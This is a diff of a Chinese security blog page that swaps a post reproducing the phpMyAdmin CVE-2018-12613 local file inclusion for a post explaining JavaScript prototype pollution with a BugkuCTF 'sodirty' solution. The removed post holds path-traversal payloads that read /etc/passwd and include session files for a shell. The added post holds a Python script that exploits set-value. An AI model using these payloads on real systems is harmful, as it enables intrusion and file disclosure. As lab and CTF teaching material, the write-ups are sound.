@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>CVE-2018-12613phpmyadmin本地文件包含复现 | 九世的博客</title>
-  <meta name="keywords" content=" 漏洞复现 ">
-  <meta name="description" content="CVE-2018-12613phpmyadmin本地文件包含复现 | 九世的博客">
+  <title>js源链污染 | 九世的博客</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="js源链污染 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -1665,25 +1665,19 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-CVE-2018-12613phpmyadmin本地文件包含复现" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-js源链污染" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">CVE-2018-12613phpmyadmin本地文件包含复现</h1>
+        <h1 class="article-title">js源链污染</h1>
     
     <div class="article-meta">
         
         
         
-        
-        <span class="tag">
-            
-            <a href="javascript:" class="color5">漏洞复现</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2020-07-21 20:46:44">2020-07-21 20:26</time>
+        创建时间:<time class="date" title="更新时间: 2021-03-10 20:10:36">2021-03-10 19:52</time>
         
     </div>
     <div class="article-meta">
@@ -1705,7 +1699,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码刨析"><span class="toc-text">代码刨析</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#js原链污染简介"><span class="toc-text">js原链污染简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js原链污染测试"><span class="toc-text">js原链污染测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bugkuctf-sodirty题目分析"><span class="toc-text">bugkuctf sodirty题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1720,137 +1714,174 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>最近看到某文章提到了，最近在学代码审计顺便看看<br>漏洞影响</p>
-<ul>
-<li>4.8.0</li>
-<li>4.8.0.1</li>
-<li>4.8.1</li>
-</ul>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>phpmyadmin 4.8.1<br>这里直接用的靶场<a href="https://store.vsplate.com/" target="_blank" rel="noopener">https://store.vsplate.com/</a></p>
-<h2 id="代码刨析"><a href="#代码刨析" class="headerlink" title="代码刨析"></a>代码刨析</h2><p>问题出现在index.php第61行<br>(index.php 55行~63行)</p>
-<pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])
-    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])
-    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])
-    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)
-    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])
-) {
-    include $_REQUEST[&#39;target&#39;]; //问题出现在这
-    exit;
+        <p>题目考的目的:js原链污染</p>
+<h2 id="js原链污染简介"><a href="#js原链污染简介" class="headerlink" title="js原链污染简介"></a>js原链污染简介</h2><blockquote>
+<p>JavaScript是一门灵活的语言，基于原型实现继承，原型是Javascript的继承的基础。<br>它本身不提供一个 class实现。（在 ES2015/ES6 中引入了 class 关键字，但那只是语法糖，JavaScript 仍然是基于原型的<br>遵循ECMAScript标准，someObject.[[Prototype]] 符号是用于指向 someObject 的原型。从 ECMAScript 6 开始，[[Prototype]] 可以通过 Object.getPrototypeOf() 和 Object.setPrototypeOf() 访问器来访问。这个等同于 JavaScript 的非标准但许多浏览器实现的属性 <strong>proto</strong></p>
+</blockquote>
+<p>每个实例对象都有一个私有属性<strong>proto</strong>指向它的构造函数的原型prototype，也就是</p>
+<pre><code class="javascript">function a(){
+    this.a=&quot;AAA&quot;
+}
+b=new a()
+b.__proto__===a.Prototype
+</code></pre>
+<p><img src="https://s3.ax1x.com/2021/03/10/6Jvp9S.png" alt=""><br>原型prototype是类的一个属性，而这个<strong>属性中的值和方法被每一个由类实例出来的对象所共有</strong>，而我们可以通过实例对象<code>test1.__proto__</code>来访问Test类的原型，那么这样就出现了一个问题，<strong>假如我们可以控制实例对象的<code>__proto__</code>属性，则等于可以修改该类所有实例对象的<code>__proto__</code>属性。</strong><br><img src="https://s3.ax1x.com/2021/03/10/6JvL2F.png" alt="网上的图"></p>
+<h2 id="js原链污染测试"><a href="#js原链污染测试" class="headerlink" title="js原链污染测试"></a>js原链污染测试</h2><p>定义一个对象测试</p>
+<pre><code class="javascript">challenger={&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;age&quot;:80}
+key={}
+challenger.__proto__.pwd2=&quot;pwd&quot;
+</code></pre>
+<p><img src="https://s3.ax1x.com/2021/03/10/6JvVA0.png" alt=""></p>
+<p>由于源链被污染，定义的pwd2值在任何地方都可以被访问到<br><img src="https://s3.ax1x.com/2021/03/10/6JvA7q.png" alt=""></p>
+<p>更直接的表明<br><img src="https://s3.ax1x.com/2021/03/10/6Jvlu9.png" alt=""></p>
+<p>非对象污染则会失败<br><img src="https://s3.ax1x.com/2021/03/10/6Jv3H1.png" alt=""></p>
+<p>but，实际上的源链污染需要找到对应能操控对象的函数来进行污染</p>
+<h2 id="bugkuctf-sodirty题目分析"><a href="#bugkuctf-sodirty题目分析" class="headerlink" title="bugkuctf sodirty题目分析"></a>bugkuctf sodirty题目分析</h2><p>源码如下:</p>
+<pre><code class="javascript">var express = require(&#39;express&#39;);
+const setFn = require(&#39;set-value&#39;);
+var router = express.Router();
+
+
+const Admin = {
+    &quot;password&quot;:process.env.password?process.env.password:&quot;password&quot;
+}
+
+
+router.post(&quot;/getflag&quot;, function (req, res, next) {
+    if (req.body.password === undefined || req.body.password === req.session.challenger.password){
+        res.send(&quot;登录失败&quot;);
+    }else{
+        if(req.session.challenger.age &gt; 79){
+            res.send(&quot;糟老头子坏滴很&quot;);
+        }
+        let key = req.body.key.toString();
+        let password = req.body.password.toString();
+        if(Admin[key] === password){
+            res.send(process.env.flag ? process.env.flag : &quot;flag{test}&quot;);
+        }else {
+            res.send(&quot;密码错误，请使用管理员用户名登录.&quot;);
+        }
+    }
+
+});
+router.get(&#39;/reg&#39;, function (req, res, next) {
+    req.session.challenger = {
+        &quot;username&quot;: &quot;user&quot;,
+        &quot;password&quot;: &quot;pass&quot;,
+        &quot;age&quot;: 80
+    }
+    res.send(&quot;用户创建成功!&quot;);
+});
+
+router.get(&#39;/&#39;, function (req, res, next) {
+    res.redirect(&#39;index&#39;);
+});
+router.get(&#39;/index&#39;, function (req, res, next) {
+    res.send(&#39;&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;./reg&quot;&gt;注册&lt;/a&gt;&#39;);
+});
+router.post(&quot;/update&quot;, function (req, res, next) {
+    if(req.session.challenger === undefined){
+        res.redirect(&#39;/reg&#39;);
+    }else{
+        if (req.body.attrkey === undefined || req.body.attrval === undefined) {
+            res.send(&quot;传参有误&quot;);
+        }else {
+            let key = req.body.attrkey.toString();
+            let value = req.body.attrval.toString();
+            setFn(req.session.challenger, key, value);
+            res.send(&quot;修改成功&quot;);
+        }
+    }
+});
+
+module.exports = router;
+</code></pre>
+<p>分析流程:</p>
+<pre><code class="text">/路径：
+1.重定向到/reg路径
+
+/reg路径:
+创建一个req.session.challenger对象
+
+/update路径:
+1.req.session.challenger如果为空则被重定向到/reg路径
+    2.req.body.attrkey或req.body.attrval为undefined的情况下返回为&quot;传参有误&quot;
+    2.如果不为undefined将设置key和value，调用setFn函数设置req.session.challenger对象的值
+传参链:
+req.body.attrkey/req.body.attrval-&gt;let key = req.body.attrkey.toString();/let value = req.body.attrval.toString()；-&gt;setFn(req.session.challenger, key, value); #原链污染点
+
+/getflag路径:
+1.req.body.password为undefined或req.body.password等于req.session.challenger对象里的password则返回登录失败
+2.req.session.challenger.age值大于79返回糟老头子坏滴很
+3.Admin对象里的key键的值等于req.body.password则返回真的flag
+</code></pre>
+<p>漏洞点出现在</p>
+<pre><code class="javascript">setFn(req.session.challenger, key, value);
+</code></pre>
+<p>setFn函数对应<code>require(&#39;set-value&#39;);</code>,位于同目录下的<code>set-value/index.js</code>里的result函数</p>
+<pre><code class="javascript">function result(target, path, value, merge) {
+  if (merge &amp;&amp; isPlain(target[path]) &amp;&amp; isPlain(value)) {
+    target[path] = merge({}, target[path], value);
+  } else {
+    target[path] = value;
+  }
 }
 </code></pre>
-<p>这段代码的内容为：</p>
-<ul>
-<li>$_REQUEST[‘target’]参数为字符串类型</li>
-<li>$_REQUEST[‘target’]参数不存在index关键字</li>
-<li>$_REQUEST[‘target’]参数不存在黑名单$target_blacklist</li>
-<li>checkPageValidity函数返回True</li>
-</ul>
-<p>checkPageValidity函数代码<br>(Core.php 443~476行)</p>
-<pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])
-{
-    if (empty($whitelist)) {
-        $whitelist = self::$goto_whitelist; //白名单
+<p>对应的Github:<a href="https://github.com/freewisdom/set-value" target="_blank" rel="noopener">https://github.com/freewisdom/set-value</a><br><img src="https://s3.ax1x.com/2021/03/10/6JvsEt.png" alt=""></p>
+<p>由于需要以<code>{&quot;key&quot;:&quot;value&quot;}</code>的方式来进行更新，所以要用json，具体是看文章知道</p>
+<p>考点如下</p>
+<pre><code>1.发现路由&quot;/reg&quot;会创建一个challenger用户字典
+2.发现路由&quot;/update&quot;可以对challenger传参键值对（attrkey和attrval），对challenger字典中进行修改
+3.路由&quot;/getflag&quot;可以获取到flag，但存在几个验证，首先需要传参两个参数（key和password）进来，并且对用户字典中的年龄进行判断，大于79会失败；其次Admin[key]需要等于password，而body.password是多少我们是不知道的
+</code></pre><p>题目解题思路如下</p>
+<pre><code>1.操控源链创建一个变量
+2.更新req.session.challenger对象里age键值
+</code></pre><p>最后请求/getflag路径的时候，设置key参数为新建变量的名称和设置password变量名为新建变量名的值,使判断成立</p>
+<pre><code class="javascript">if (req.body.password === undefined || req.body.password === req.session.challenger.password){
+        res.send(&quot;登录失败&quot;);
+    }else{
+        if(req.session.challenger.age &gt; 79){
+            res.send(&quot;糟老头子坏滴很&quot;);
+        }
+        let key = req.body.key.toString();
+        let password = req.body.password.toString();
+        if(Admin[key] === password){
+            res.send(process.env.flag ? process.env.flag : &quot;flag{test}&quot;);
+        }else {
+            res.send(&quot;密码错误，请使用管理员用户名登录.&quot;);
+        }
     }
-    if (! isset($page) || !is_string($page)) { //$page参数不存在，不是string类型
-        return false;
-    }
-
-
-    if (in_array($page, $whitelist)) { //$page参数在白名单里 （无法利用，没对$page参数做任何取值判断）
-        return true;
-    }
-
-
-    $_page = mb_substr(
-        $page,
-        0,
-        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
-    ); //取第一个字符到?号前一个位置的内容
-    if (in_array($_page, $whitelist)) { //$page里面的参数是否在白名单内 （无法利用，$page参数带?就会被php认为php里的参数）
-        return true;
-    }
-
-
-    $_page = urldecode($page); //url解码
-    $_page = mb_substr(
-        $_page,
-        0,
-        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
-    ); //取第一个字符到?号前一个位置的内容
-    if (in_array($_page, $whitelist)) { //url解码后判断$page里面的参数是否在白名单内 （可以利用，因为url编码绕过了上面所描述的问题）
-        return true;
-    }
-
-
-    return false;
-}
 </code></pre>
-<p>白名单</p>
-<pre><code class="php">public static $goto_whitelist = array(
-    &#39;db_datadict.php&#39;,
-    &#39;db_sql.php&#39;,
-    &#39;db_events.php&#39;,
-    &#39;db_export.php&#39;,
-    &#39;db_importdocsql.php&#39;,
-    &#39;db_multi_table_query.php&#39;,
-    &#39;db_structure.php&#39;,
-    &#39;db_import.php&#39;,
-    &#39;db_operations.php&#39;,
-    &#39;db_search.php&#39;,
-    &#39;db_routines.php&#39;,
-    &#39;export.php&#39;,
-    &#39;import.php&#39;,
-    &#39;index.php&#39;,
-    &#39;pdf_pages.php&#39;,
-    &#39;pdf_schema.php&#39;,
-    &#39;server_binlog.php&#39;,
-    &#39;server_collations.php&#39;,
-    &#39;server_databases.php&#39;,
-    &#39;server_engines.php&#39;,
-    &#39;server_export.php&#39;,
-    &#39;server_import.php&#39;,
-    &#39;server_privileges.php&#39;,
-    &#39;server_sql.php&#39;,
-    &#39;server_status.php&#39;,
-    &#39;server_status_advisor.php&#39;,
-    &#39;server_status_monitor.php&#39;,
-    &#39;server_status_queries.php&#39;,
-    &#39;server_status_variables.php&#39;,
-    &#39;server_variables.php&#39;,
-    &#39;sql.php&#39;,
-    &#39;tbl_addfield.php&#39;,
-    &#39;tbl_change.php&#39;,
-    &#39;tbl_create.php&#39;,
-    &#39;tbl_import.php&#39;,
-    &#39;tbl_indexes.php&#39;,
-    &#39;tbl_sql.php&#39;,
-    &#39;tbl_export.php&#39;,
-    &#39;tbl_operations.php&#39;,
-    &#39;tbl_structure.php&#39;,
-    &#39;tbl_relation.php&#39;,
-    &#39;tbl_replace.php&#39;,
-    &#39;tbl_row_action.php&#39;,
-    &#39;tbl_select.php&#39;,
-    &#39;tbl_zoom_select.php&#39;,
-    &#39;transformation_overview.php&#39;,
-    &#39;transformation_wrapper.php&#39;,
-    &#39;user_password.php&#39;,
-);
+<p>payload如下</p>
+<pre><code class="python">import requests
+
+class getflag(object):
+    def __init__(self,url):
+        self.requests=requests.session()
+        self.headers={&quot;Content-Type&quot;: &quot;application/json&quot;}
+        self.reg=&quot;{}/reg&quot;.format(url)
+        self.update=&quot;{}/update&quot;.format(url)
+        self.getflag=&quot;{}/getflag&quot;.format(url)
+
+    def getflag_(self):
+        reg=self.requests.get(self.reg)
+        print(reg.text)
+
+        update=self.requests.post(self.update,headers=self.headers,json={&quot;attrkey&quot;:&quot;__proto__.pwd22&quot;,&quot;attrval&quot;:&quot;pwd&quot;})
+        print(update.text)
+
+        update2=self.requests.post(self.update,headers=self.headers,json={&quot;attrkey&quot;:&quot;age&quot;,&quot;attrval&quot;:10})
+        print(update2.text)
+
+        flag=self.requests.post(self.getflag,headers=self.headers,json={&quot;key&quot;:&quot;pwd22&quot;,&quot;password&quot;:&quot;pwd&quot;})
+        print(flag.text)
+
+if __name__ == &#39;__main__&#39;:
+    obj=getflag(&quot;http://114.67.246.176:19392&quot;)
+    obj.getflag_()
 </code></pre>
-<p>利用的payload</p>
-<pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd当解析到/../../../../../../../../etc/passwd会进行包含，实现利用
-</code></pre><p>验证是否存在包含</p>
-<pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
-</code></pre><p><img src="https://s1.ax1x.com/2020/07/21/UojReJ.png" alt=""></p>
-<p>利用session文件getshell （方法有很多）<br>（在cookie找到phpmyadmin参数）</p>
-<pre><code>/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_01876fad4b7e3596a65aa96048b99def #有些是/tmp路径有些是别的路径被这个坑的老惨了
-</code></pre><p><img src="https://s1.ax1x.com/2020/07/21/UojIW6.png" alt=""></p>
-<p>新版phpmyadmin修复代码</p>
-<pre><code class="php">if (isset($GLOBALS[&#39;target&#39;]) &amp;&amp; is_string($GLOBALS[&#39;target&#39;]) &amp;&amp; !empty($GLOBALS[&#39;target&#39;]) &amp;&amp; in_array($GLOBALS[&#39;target&#39;], $goto_whitelist)) {
-    $main_target = $GLOBALS[&#39;target&#39;];
-}
-</code></pre>
-<p>参考链接：<a href="https://blog.csdn.net/qq_34444097/article/details/85264686" target="_blank" rel="noopener">https://blog.csdn.net/qq_34444097/article/details/85264686</a></p>
+<p><img src="https://s3.ax1x.com/2021/03/10/6Jv28S.png" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/qq_41107295/article/details/95789944" target="_blank" rel="noopener">https://blog.csdn.net/qq_41107295/article/details/95789944</a><br><a href="https://www.cnblogs.com/escape-w/p/12347705.html" target="_blank" rel="noopener">https://www.cnblogs.com/escape-w/p/12347705.html</a><br><a href="https://www.wlhhlc.top/posts/49040/" target="_blank" rel="noopener">https://www.wlhhlc.top/posts/49040/</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1860,12 +1891,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>CVE-2018-12613phpmyadmin本地文件包含复现</p>
+    <p><span class="copy-title">文章标题:</span>js源链污染</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-07-21, 20:26:18</p>
-    <p><span class="copy-title">最后更新:</span>2020-07-21, 20:46:44</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/299f8a4a.html" title="CVE-2018-12613phpmyadmin本地文件包含复现">http://422926799.github.io/posts/299f8a4a.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-03-10, 19:52:49</p>
+    <p><span class="copy-title">最后更新:</span>2021-03-10, 20:10:36</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/3e45dbe4.html" title="js源链污染">http://422926799.github.io/posts/3e45dbe4.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
